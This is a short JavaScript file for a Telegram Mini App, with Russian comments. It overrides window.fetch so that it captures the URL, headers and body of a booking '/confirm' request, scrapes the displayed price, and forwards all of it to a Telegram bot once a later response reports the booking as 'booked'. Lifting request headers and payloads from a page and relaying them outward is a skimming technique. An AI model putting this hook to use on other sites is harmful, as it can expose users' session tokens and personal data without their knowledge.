Telegram.WebApp.ready();

const originalFetch = window.fetch;

let interceptedRequest = null; // Глобальная переменная для хранения данных из /confirm

// Первый обработчик для /confirm
window.fetch = async (...args) => {
    const url = args[0];

    if (url.includes('/confirm')) {
        // Извлекаем тело запроса
        const requestPayload = args[1]?.body;
        let payloadData = null;
        if (requestPayload) {
            try {
                payloadData = typeof requestPayload === 'string' ? requestPayload : JSON.stringify(requestPayload);
            } catch (error) {
                console.error('Error reading request payload:', error);
            }
        }

        // Извлекаем информацию о цене
        const priceElement = document.querySelector('#hr-modal > div.hr-modal > div > div.basket-page__container > div.basket-page__content > div.form-container > div.form > div.form__price-block.price-block > div:nth-child(2) > div.price-block__right');
        const priceInfo = priceElement ? priceElement.innerText : 'Информация не найдена';

        // Сохраняем данные в глобальную переменную
        interceptedRequest = {
            url,
            method: args[1]?.method || 'GET',
            headers: args[1]?.headers,
            payload: payloadData,
            priceInfo: priceInfo,
        };

        console.log('Данные /confirm сохранены:', interceptedRequest);
        
        // Продолжаем оригинальный запрос
        return originalFetch(...args);
    }

    // Второй обработчик для /booking/.../info
    if (url.includes('/booking/') && url.endsWith('/info')) {
        console.log('Перехвачен запрос к /booking/.../info');

        const response = await originalFetch(...args);

        if (response.ok) {
            try {
                const responseData = await response.clone().json();
                
                if (responseData && responseData.status === "booked") {
                    console.log('Статус ответа "booked"');
                    
                    // Отправляем сохраненные данные из /confirm
                    if (interceptedRequest) {
                        try {
                            Telegram.WebApp.sendData(JSON.stringify(interceptedRequest));
                        } catch (error) {
                            console.error('Ошибка при отправке данных в Telegram:', error);
                        }
                    }
                }
            } catch (error) {
                console.error('Ошибка при разборе JSON ответа:', error);
            }
        }

        return response;
    }

    // Для всех остальных запросов
    return originalFetch(...args);
};